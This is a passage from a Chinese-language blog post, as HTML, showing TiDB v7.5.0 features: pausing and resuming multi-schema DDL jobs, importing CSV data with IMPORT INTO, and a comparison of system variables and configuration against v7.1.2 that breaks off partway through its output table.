<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL [test]<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t2 (c1 <span class="type">int</span>, c2 <span class="type">int</span>, c3 <span class="type">int</span>);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.191</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [test]<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> t2 <span class="keyword">add</span> index idx_c1 (c1), <span class="keyword">add</span> index idx_c2 (c2), <span class="keyword">add</span> index idx_c3 (c3), <span class="keyword">add</span> index idx_c1_c2 (c1, c2), <span class="keyword">add</span> <span class="keyword">unique</span> idx_uni_c3 (c3), <span class="keyword">add</span> <span class="keyword">primary</span> key (c1), <span class="keyword">add</span> fulltext (c2);</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected, <span class="number">1</span> warning (<span class="number">8</span> min <span class="number">37.725</span> sec)</span><br><span class="line"></span><br><span class="line">Warning (Code <span class="number">1214</span>): The used <span class="keyword">table</span> type doesn<span class="string">&#x27;t support FULLTEXT indexes</span></span><br></pre></td></tr></table></figure></div>
<ul>
<li>SESSION 2</li>
</ul>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> admin <span class="keyword">show</span> ddl jobs;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------------------------+-------------------------------------+----------------------+-----------+----------+-----------+---------------------+---------------------+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> JOB_ID <span class="operator">|</span> DB_NAME <span class="operator">|</span> TABLE_NAME              <span class="operator">|</span> JOB_TYPE                            <span class="operator">|</span> SCHEMA_STATE         <span class="operator">|</span> SCHEMA_ID <span class="operator">|</span> TABLE_ID <span class="operator">|</span> ROW_COUNT <span class="operator">|</span> CREATE_TIME         <span class="operator">|</span> START_TIME          <span class="operator">|</span> END_TIME            <span class="operator">|</span> STATE    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------------------------+-------------------------------------+----------------------+-----------+----------+-----------+---------------------+---------------------+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">alter</span> <span class="keyword">table</span> multi<span class="operator">-</span>schema change     <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span> <span class="comment">/* ingest */</span> <span class="operator">|</span> write reorganization <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span> <span class="comment">/* ingest */</span> <span class="operator">|</span> write reorganization <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span>              <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> queueing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span>              <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> queueing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span>              <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> queueing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> <span class="keyword">primary</span> key <span class="comment">/* subjob */</span>        <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> queueing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">106</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">create</span> <span class="keyword">table</span>                        <span class="operator">|</span> public               <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">52</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">52</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">52</span> <span class="operator">|</span> synced   <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> ADMIN PAUSE DDL JOBS <span class="number">107</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> JOB_ID <span class="operator">|</span> <span class="keyword">RESULT</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">107</span>    <span class="operator">|</span> successful <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">2</span> min <span class="number">48.559</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> admin <span class="keyword">show</span> ddl jobs;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------------------------+-------------------------------------+----------------------+-----------+----------+-----------+---------------------+---------------------+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span> JOB_ID <span class="operator">|</span> DB_NAME <span class="operator">|</span> TABLE_NAME              <span class="operator">|</span> JOB_TYPE                            <span class="operator">|</span> SCHEMA_STATE         <span class="operator">|</span> SCHEMA_ID <span class="operator">|</span> TABLE_ID <span class="operator">|</span> ROW_COUNT <span class="operator">|</span> CREATE_TIME         <span class="operator">|</span> START_TIME          <span class="operator">|</span> END_TIME            <span class="operator">|</span> STATE    <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+---------+-------------------------+-------------------------------------+----------------------+-----------+----------+-----------+---------------------+---------------------+---------------------+----------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">alter</span> <span class="keyword">table</span> multi<span class="operator">-</span>schema change     <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> paused   <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span> <span class="comment">/* ingest */</span> <span class="operator">|</span> write reorganization <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span> <span class="comment">/* ingest */</span> <span class="operator">|</span> write reorganization <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">49</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span> <span class="comment">/* ingest */</span> <span class="operator">|</span> write reorganization <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">50</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span> <span class="comment">/* ingest */</span> <span class="operator">|</span> write reorganization <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">51</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">running</span>  <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> index <span class="comment">/* subjob */</span>              <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> queueing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">107</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">add</span> <span class="keyword">primary</span> key <span class="comment">/* subjob */</span>        <span class="operator">|</span> <span class="keyword">none</span>                 <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">15</span>:<span class="number">47</span> <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> <span class="keyword">NULL</span>                <span class="operator">|</span> queueing <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">106</span> <span class="operator">|</span> test    <span class="operator">|</span> t2                      <span class="operator">|</span> <span class="keyword">create</span> <span class="keyword">table</span>                        <span class="operator">|</span> public               <span class="operator">|</span>         <span class="number">2</span> <span class="operator">|</span>      <span class="number">105</span> <span class="operator">|</span>         <span class="number">0</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">52</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">52</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">12</span>:<span class="number">52</span> <span class="operator">|</span> synced   <span class="operator">|</span></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">MySQL [information_schema]<span class="operator">&gt;</span> ADMIN RESUME DDL JOBS <span class="number">107</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> JOB_ID <span class="operator">|</span> <span class="keyword">RESULT</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="number">107</span>    <span class="operator">|</span> successful <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.024</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="DDL-IMPORT-INTO">DDL: IMPORT INTO</h2>
<p><a href="https://docs.pingcap.com/zh/tidb/stable/sql-statement-import-into"><code>IMPORT INTO</code></a> 语句使用 TiDB Lightning 的物理导入模式，用于将 CSV、SQL、PARQUET 等格式的数据导入到 TiDB 的一张空表中。</p>
<p><code>IMPORT INTO</code> 支持导入存储在 Amazon S3、GCS、Azure Blob Storage 和 TiDB 本地的数据文件。</p>
<p>在 v7.5.0 中，<code>IMPORT INTO</code> SQL 语句正式 GA。这种导入方式无需单独部署和管理 TiDB Lightning，在降低了数据导入难度的同时，大幅提升了数据导入效率。</p>
<h3 id="实例演示-2">实例演示</h3>
<p>演示将表数据导出到本地文件，创建新表，并使用 <code>IMPORT INTO</code> 语句将数据导入。</p>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">MySQL [test]<span class="operator">&gt;</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> t1 <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/tmp/t1.csv&#x27;</span> FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;,&#x27;</span> ENCLOSED <span class="keyword">BY</span> <span class="string">&#x27;&quot;&#x27;</span>;</span><br><span class="line">Query OK, <span class="number">2</span> <span class="keyword">rows</span> affected (<span class="number">0.004</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [test]<span class="operator">&gt;</span> \<span class="operator">!</span> cat <span class="operator">/</span>tmp<span class="operator">/</span>t1.csv</span><br><span class="line">&quot;1&quot;,&quot;1&quot;,&quot;1&quot;</span><br><span class="line">&quot;1&quot;,&quot;2&quot;,&quot;3&quot;</span><br><span class="line"></span><br><span class="line">MySQL [test]<span class="operator">&gt;</span> <span class="keyword">create</span> <span class="keyword">table</span> t1_1 <span class="keyword">like</span> t1;</span><br><span class="line">Query OK, <span class="number">0</span> <span class="keyword">rows</span> affected (<span class="number">0.375</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [test]<span class="operator">&gt;</span> IMPORT <span class="keyword">INTO</span> t1_1 <span class="keyword">FROM</span> <span class="string">&#x27;/tmp/t1.csv&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+---------------+----------+-------+----------+------------------+---------------+----------------+----------------------------+----------------------------+----------------------------+------------+</span></span><br><span class="line"><span class="operator">|</span> Job_ID <span class="operator">|</span> Data_Source <span class="operator">|</span> Target_Table  <span class="operator">|</span> Table_ID <span class="operator">|</span> Phase <span class="operator">|</span> Status   <span class="operator">|</span> Source_File_Size <span class="operator">|</span> Imported_Rows <span class="operator">|</span> Result_Message <span class="operator">|</span> Create_Time                <span class="operator">|</span> Start_Time                 <span class="operator">|</span> End_Time                   <span class="operator">|</span> Created_By <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+---------------+----------+-------+----------+------------------+---------------+----------------+----------------------------+----------------------------+----------------------------+------------+</span></span><br><span class="line"><span class="operator">|</span>      <span class="number">2</span> <span class="operator">|</span> <span class="operator">/</span>tmp<span class="operator">/</span>t1.csv <span class="operator">|</span> `test`.`t1_1` <span class="operator">|</span>      <span class="number">110</span> <span class="operator">|</span>       <span class="operator">|</span> finished <span class="operator">|</span> <span class="number">24</span>B              <span class="operator">|</span>             <span class="number">2</span> <span class="operator">|</span>                <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">36.500342</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">39.038744</span> <span class="operator">|</span> <span class="number">2023</span><span class="number">-12</span><span class="number">-07</span> <span class="number">11</span>:<span class="number">59</span>:<span class="number">45.550724</span> <span class="operator">|</span> root@<span class="operator">%</span>     <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------+-------------+---------------+----------+-------+----------+------------------+---------------+----------------+----------------------------+----------------------------+----------------------------+------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">9.382</span> sec)</span><br><span class="line"></span><br><span class="line">MySQL [test]<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> t1_1;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+</span></span><br><span class="line"><span class="operator">|</span> c1   <span class="operator">|</span> c2   <span class="operator">|</span> c3   <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span>    <span class="number">1</span> <span class="operator">|</span>    <span class="number">2</span> <span class="operator">|</span>    <span class="number">3</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------+------+</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.013</span> sec)</span><br></pre></td></tr></table></figure></div>
<h2 id="全局变量、配置参数对比-v7-1-2-vs-v7-5-0">全局变量、配置参数对比 v7.1.2 vs v7.5.0</h2>
<p>关于 TiDB Server 的系统变量和配置参数，可从 Release Notes 获取信息，官方文档中，更直接的办法是用工具直接对比。</p>
<p>下面将列举 v7.1.2 和 v7.5.0 两个版本的全局变量、配置参数差异。感谢 @人如其名 贡献的“炒鸡”好用小工具。</p>
<p>对比结果如下：</p>
<img  alt="diff1.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231207-66c011b0-9364-435c-8f02-5f7454dffe39.png"
                      referrerpolicy="no-referrer"
                >
<img  alt="diff2.png" 
                     lazyload
                     src="/img/loading.svg"
                     data-src="https://oss-emcsprod-public.modb.pro/image/editor/20231207-55c75ab5-69a6-4f8f-a8b5-cf783d287fbf.png"
                      referrerpolicy="no-referrer"
                >
<p>全局系统变量变更 24 项，tidb-server 配置参数新增 6 项。<br>
全局系统变量变更 5 项，tidb-server 配置参数变更 3 项。<br>
合计，38 项。</p>
<!--
依赖
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dnf install mysql sqlite python3</span><br><span class="line"></span><br><span class="line">./main.py collect -H 192.168.8.92</span><br><span class="line">./main.py report</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> type,<span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> information_schema.cluster_config <span class="keyword">group</span> <span class="keyword">by</span> type;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- v7.5.0</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+----------+</span></span><br><span class="line"><span class="operator">|</span> type    <span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+----------+</span></span><br><span class="line"><span class="operator">|</span> tidb    <span class="operator">|</span>      <span class="number">392</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tikv    <span class="operator">|</span>      <span class="number">685</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pd      <span class="operator">|</span>      <span class="number">180</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tiflash <span class="operator">|</span>      <span class="number">678</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.06</span> sec)</span><br><span class="line"></span><br><span class="line"><span class="comment">-- v7.1.2</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+----------+</span></span><br><span class="line"><span class="operator">|</span> type    <span class="operator">|</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+----------+</span></span><br><span class="line"><span class="operator">|</span> tidb    <span class="operator">|</span>      <span class="number">190</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tikv    <span class="operator">|</span>      <span class="number">664</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> pd      <span class="operator">|</span>      <span class="number">171</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> tiflash <span class="operator">|</span>      <span class="number">656</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">---------+----------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.03</span> sec)</span><br></pre></td></tr></table></figure></div>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line">[root@rocky9 tidb_config_diff]# ./main.py report</span><br><span class="line">┌──────────┬─────────┬──────────┬────────────────────────────────────────────┬──────────────────────────────────────────────────────────────────────────┬──────────────────────────────────────────────────────────────────────────┐</span><br><span class="line">│   Number │ scope   │ type     │ var_name                                   │ var_value_v7.1.2_host_192.168.8.92:4000                                  │ var_value_v7.5.0_host_192.168.8.92:4000                                  │</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        1 │ global  │ variable │ default_collation_for_utf8mb4              │ NotFound                                                                 │ utf8mb4_bin                                                              │https://docs.pingcap.com/zh/tidb/stable/system-variables#default_collation_for_utf8mb4-span-classversion-mark%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5span</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        2 │ global  │ variable │ tidb_allow_tiflash_cop                     │ NotFound                                                                 │ OFF                                                                      │https://asktug.com/t/topic/1018633</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        3 │ global  │ variable │ tidb_analyze_skip_column_types             │ NotFound                                                                 │ json,blob,mediumblob,longblob                                            │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_analyze_skip_column_types-%E4%BB%8E-v720-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        4 │ global  │ variable │ tidb_build_sampling_stats_concurrency      │ NotFound                                                                 │ 2                                                                        │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_build_sampling_stats_concurrency-%E4%BB%8E-v750-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        5 │ global  │ variable │ tidb_cloud_storage_uri                     │ NotFound                                                                 │                                                                          │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_cloud_storage_uri-%E4%BB%8E-v740-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        6 │ global  │ variable │ tidb_enable_async_merge_global_stats       │ NotFound                                                                 │ ON                                                                       │https://docs.pingcap.com/zh/tidb/stable/system-variables#tidb_enable_async_merge_global_stats-%E4%BB%8E-v750-%E7%89%88%E6%9C%AC%E5%BC%80%E5%A7%8B%E5%BC%95%E5%85%A5</span><br><span class="line">├──────────┼─────────┼──────────┼────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┼──────────────────────────────────────────────────────────────────────────┤</span><br><span class="line">│        7 │ global  │ variable │ tidb_enable_check_constraint               │ NotFound                                                                 │ OFF                                                                      